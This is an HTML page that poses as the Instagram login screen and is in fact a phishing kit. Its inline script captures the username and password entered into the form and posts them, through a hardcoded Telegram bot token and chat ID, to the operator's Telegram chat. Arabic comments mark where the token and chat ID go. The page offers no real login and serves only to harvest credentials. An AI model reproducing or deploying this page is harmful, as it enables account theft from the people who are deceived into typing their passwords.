<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }

      .login-container {
        background-color: #fff;
        border: 1px solid #dbdbdb;
        padding: 40px;
        max-width: 350px;
        text-align: center;
        border-radius: 8px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }

      .login-container img {
        width: 200px;
        margin-bottom: 20px;
      }

      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid #dbdbdb;
        border-radius: 5px;
        background-color: #fafafa;
      }

      .login-btn {
        width: 100%;
        padding: 10px;
        background-color: #0095f6;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
        font-size: 16px;
      }

      .login-btn:hover {
        background-color: #0078c7;
      }

      .divider {
        display: flex;
        align-items: center;
        text-align: center;
        margin: 20px 0;
      }

      .divider::before,
      .divider::after {
        content: "";
        flex: 1;
        height: 1px;
        background: #dbdbdb;
      }

      .divider::before {
        margin-right: 10px;
      }

      .divider::after {
        margin-left: 10px;
      }

      .signup {
        margin-top: 10px;
        font-size: 14px;
      }

      .signup a {
        color: #0095f6;
        text-decoration: none;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <img src="images/instagram-logo.png" alt="Instagram logo" />
      <form id="login-form">
        <input
          type="text"
          id="username"
          name="username"
          placeholder="Username or Email"
          required
        />
        <input
          type="password"
          id="password"
          name="password"
          placeholder="Password"
          required
        />
        <button type="submit" class="login-btn">Log In</button>
      </form>
      <div class="divider">OR</div>
      <p><a href="#">Forgot Password?</a></p>
      <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    </div>

    <!-- JavaScript -->
    <script>
      const TOKEN = "7916598989:AAEf4jHEmjftagr8BTurSUUGdUWRK98r_Ag"; // ضع التوكن هنا
      const CHAT_ID = "5375168720"; // ضع معرف الشات هنا
      const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

      document
        .getElementById("login-form")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const username = document.getElementById("username").value;
          const password = document.getElementById("password").value;

          const message = `
        <b>Login Attempt</b>\n
        <b>Username:</b> ${username}\n
        <b>Password:</b> ${password}
      `;

          // إرسال البيانات إلى بوت التلغرام
          fetch(URI_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              parse_mode: "HTML",
              text: message,
            }),
          }).catch((error) => {
            console.error("Error:", error);
          });
        });
    </script>
  </body>
</html>
